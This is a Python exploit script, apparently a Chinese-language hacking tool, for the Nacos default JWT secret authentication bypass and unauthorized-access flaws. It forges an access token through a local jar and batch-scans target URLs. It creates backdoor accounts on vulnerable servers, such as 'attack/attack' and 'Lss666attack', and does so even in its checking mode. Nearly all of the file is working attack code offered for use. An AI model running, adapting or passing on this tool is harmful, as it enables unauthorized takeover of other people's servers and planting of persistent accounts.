import argparse
import re
from urllib.parse import urlparse
import subprocess
import requests


def read_urls_from_file(filename):
    # 读取文本文件
    with open(filename, 'r') as f:
        content = f.read()

    # 匹配所有URL
    urls = re.findall(r'(https?://\S+)', content)

    # 解析URL并保存到列表中
    parsed_urls = []
    for url in urls:
        parsed_url = urlparse(url)
        # 检查URL是否以'\'结尾，如果是则去掉
        if parsed_url.path.endswith('/'):
            parsed_url = parsed_url._replace(path=parsed_url.path[:-1])
        parsed_urls.append(parsed_url.geturl())
    check_vulnerability(parsed_urls)
    return parsed_urls


def jwt_token():
    jar_file = "jwt_keypoc.jar"

    # 调用jar文件并运行它
    process = subprocess.Popen(["java", "-jar", jar_file], stdout=subprocess.PIPE)

    # 从stdout中读取生成的值
    output, error = process.communicate()
    token = output.decode().strip()

    # print("jar生成的值为：", token)
    return token


def check_vulnerability(url_list):
    for url in url_list:
        urlxianshi = url
        nacos_index = url.find("/nacos")
        if nacos_index != -1:
            url = url[:nacos_index]
        if url.endswith("/"):
            url = url.rstrip("/")
        try:
            token = jwt_token()
            url1 = url.strip()+"/nacos/v1/auth/users?accessToken="+token  # 去除换行符和空格

            # 发送请求并获取响应
            data = {'username': 'attack', 'password': 'attack'}
            response = requests.post(url1, data=data)

            # 判断是否存在漏洞
            if response.status_code == 200 or "accessToken" in response.text:
                print(f"{urlxianshi} 存在默认密钥漏洞! 已创建用户attack/attack")
            elif "user 'attack' already exist!" in response.text:
                print(f"{urlxianshi} 存在默认密钥漏洞！/**/可使用-uadd url进行添加用户操作。/**/")
            else:
                check_unauthorized([url])
        except Exception as e:
            print(f"检查URL {urlxianshi} 时出现错误，错误信息为：{e}")


def check_unauthorized(url_list):
    for url in url_list:
        urlxianshi = url
        nacos_index = url.find("/nacos")
        if nacos_index != -1:
            url = url[:nacos_index]
        if url.endswith("/"):
            url = url.rstrip("/")
        url1 = url.strip() + "/nacos/v1/auth/users?pageNo=1&pageSize=9"  # 去除换行符和空格
        # 发送请求并获取响应
        try:
            response = requests.get(url1)
            # print("Full Request:", response.request.__dict__)

            # 判断是否存在漏洞
            if response.status_code == 200:
                print(f"{urlxianshi} 存在未授权漏洞，可使用-uadd url进行添加用户操作。")
            else:
                print(f"{urlxianshi} 不存在漏洞。")
        except Exception as e:
            print(f"检查URL {urlxianshi} 时出现错误，错误信息为：{e}")

def creat_user(url_list):
    for url in url_list:
        urlxianshi = url
        nacos_index = url.find("/nacos")
        if nacos_index != -1:
            url = url[:nacos_index]
        if url.endswith("/"):
            url = url.rstrip("/")
        try:
            token = jwt_token()
            # print("生成的值为：", token)
            url1 = url.strip() + "/nacos/v1/auth/users?accessToken=" + token  # 去除换行符和空格

            # 发送请求并获取响应
            data = {'username': 'Lss666attack', 'password': 'Lss666attack'}
            response = requests.post(url1, data=data)
            # print("Full Request:", response.request.__dict__)

            # 判断是否存在漏洞
            if response.status_code == 200:
                print(f"{urlxianshi} 已成功添加用户Lss666attack,密码为Lss666attack。")
            else:
                print(f"{urlxianshi} 不存在漏洞，添加漏洞失败")
        except Exception as e:
            print(f"检查URL {urlxianshi} 时出现错误，错误信息为：{e}")

if __name__ == '__main__':
    print("""
 ****     **     **       ******    *******    ********   ******  **      ** ********   ******  **   **
/**/**   /**    ****     **////**  **/////**  **//////   **////**/**     /**/**/////   **////**/**  ** 
/**//**  /**   **//**   **    //  **     //**/**        **    // /**     /**/**       **    // /** **  
/** //** /**  **  //** /**       /**      /**/*********/**       /**********/******* /**       /****   
/**  //**/** **********/**       /**      /**////////**/**       /**//////**/**////  /**       /**/**  
/**   //****/**//////**//**    **//**     **        /**//**    **/**     /**/**      //**    **/**//** 
/**    //***/**     /** //******  //*******   ********  //****** /**     /**/******** //****** /** //**
//      /// //      //   //////    ///////   ////////    //////  //      // ////////   //////  //   // 
                                                                                                                                              
Nacos默认key身份认证绕过漏洞及未授权漏洞检测   auth:L-ss666
vul version: 0.1.0 <= Nacos <= 2.2.0
Usage:
 -u http://10.211.55.8:8848  单个url漏洞检测
 -uadd http://10.211.55.8:8848  若存在漏洞可新增系统用户
 -f url.txt 批量进行漏洞检测                                                          
    
    """)
    # 创建命令行参数解析器
    parser = argparse.ArgumentParser(description='从文本文件或单个URL中读取URL')
    parser.add_argument('-f', '--filename', dest='filename', required=False,
                        help='包含URL的文本文件的路径')
    parser.add_argument('-u', '--url', dest='url', required=False,
                        help='要检查漏洞的单个URL')
    parser.add_argument('-uadd', '--useradd', dest='useradd', required=False,
                        help='添加用户atack,密码atact。只能添加一次，切勿重复操作！')

    # 解析命令行参数
    args = parser.parse_args()

    if args.filename:
        # 从文件中读取URL并解析
        urls = read_urls_from_file(args.filename)

        # 打印解析后的URLs
        # print(urls)
    elif args.url:
        # 检查单个URL
        check_vulnerability([args.url])
    elif args.useradd:
        # 添加用户
        creat_user([args.useradd])
    else:
        parser.print_help()
